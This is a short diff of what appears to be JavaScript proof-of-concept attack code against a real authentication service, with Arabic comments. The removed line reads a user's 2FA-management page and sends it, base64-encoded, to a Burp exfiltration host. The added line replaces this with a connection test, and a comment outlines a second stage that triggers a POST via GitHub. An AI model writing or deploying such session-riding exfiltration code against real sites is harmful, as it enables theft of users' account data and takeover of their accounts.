@@ -24,7 +24,7 @@
                 let response = await fetch("https://auth.plumsail.com/api/account/users/manage/2fa/link");
                 let content = await response.text();
                 // إرسال البيانات لـ Burp (مشفرة لتجنب مشاكل الرموز)
-                fetch(burpExfil + "/?step1_data=" + btoa(unescape(encodeURIComponent(content))), {mode: 'no-cors'});
+                fetch(burpExfil + "/?test=connection_works", {mode: 'no-cors'});
             } catch(e) { console.log("Step 1 skipped"); }
 
             // المرحلة 2: مراقبة جيت هب لتنفيذ طلب الـ POST من الصورة الثانية
